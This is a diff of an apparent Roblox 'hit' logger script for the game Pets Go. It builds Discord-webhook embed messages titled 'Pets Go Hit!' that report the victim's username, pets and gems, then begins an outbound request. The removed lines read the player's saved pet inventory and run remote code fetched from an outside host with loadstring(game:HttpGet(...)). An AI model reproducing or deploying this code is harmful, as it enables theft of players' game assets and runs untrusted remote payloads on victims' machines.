@@ -1,41 +1,17 @@
 return function(dh,pn,gn,dp)
 if not dp then dp = 0 end
 local msg = ""
-if gn == 100 then
-gn = "0 - Not unlocked"
-end
-local tp = "(might be inaccurate)"
-
-local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
-local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
-save = save.Get()
-local tab = {}
-for i,v in pairs(save.Inventory.Pet) do
-local x = table.clone(v)
-table.insert(tab, x)
-end
-table.sort(tab, function(a,b)
-return dir[a.id].difficulty <= dir[b.id].difficulty
-end)
-for i=1,3,1 do
-tp=tp.."\\n"..tab[i].id.." (1/"..dir[tab[i].id].difficulty..")"
-end
-loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tp)
-
 if dh then
-msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..tp..'","name":"Top Pets","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
+msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
 else
-msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..tp..'","name":"Top Pets","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
+msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
 end
 local log = ""
 if dh then
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..tp..'","name":"Top Pets","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":""}'
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":""}'
 else
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..tp..'","name":"Top Pets","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":""}'
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":""}'
 end
-print(tp)
-print(msg)
-print(log)
 local response =
         request(
         {
